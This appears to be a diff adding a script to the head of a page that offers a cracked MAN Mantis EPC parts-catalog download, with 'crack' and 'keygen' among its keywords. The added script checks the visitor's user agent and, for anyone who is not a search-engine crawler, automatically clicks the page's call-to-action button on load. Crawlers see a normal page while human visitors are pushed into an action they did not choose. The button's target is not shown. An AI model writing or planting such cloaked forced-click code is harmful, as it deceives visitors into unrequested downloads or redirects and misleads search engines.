@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAN Mantis EPC 05.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download MAN Mantis EPC 05.2024 for all regions and multiple languages. Comprehensive spare parts catalog for MAN trucks, buses, and engines.">
     <meta name="keywords" content="MAN Mantis EPC, MAN Mantis EPC 2024, MAN EPC catalogue, MAN EPC download, MAN EPC free download, MAN Mantis EPC download, MAN Mantis EPC free download, MAN Mantis 05.2024, MAN electronic spare parts catalog, MAN EPC crack, MAN EPC keygen, MAN Mantis EPC multilingual, MAN truck EPC, MAN bus EPC, MAN engine EPC, MAN tools EPC, ман эпц каталог, ман мантис эпц, ман мантис эпц 2024, ман эпц скачать бесплатно, ман каталог запасных частей скачать, ман эпц скачать, ман эпц программы, ман экслион эпц, MAN Mantis EPC catalogue free download, ман эпс, епк ман мантис, ман эммантис 2024, MAN EPC Windows 10, самосвалы ман эпц скачать бесплатно, MAN Mantis EPC, MAN Mantis EPC 2024 download, MAN Mantis EPC high speed download, MAN Mantis EPC all regions, MAN Mantis EPC multilingual, MAN Mantis EPC Windows 10, MAN spare parts catalog, MAN trucks catalog, MAN buses catalog, MAN engines catalog, MAN tools catalog, MAN EPC multiple languages, MAN Mantis EPC free 2024, MAN Mantis EPC free multilingual download, MAN EPC high speed download, MAN EPC Windows 10, MAN Mantis EPC software, MAN Mantis EPC catalog, MAN Mantis EPC 2024 crack, ман мантис эпц скачать, epc ман 2024 скачать">
     <style>
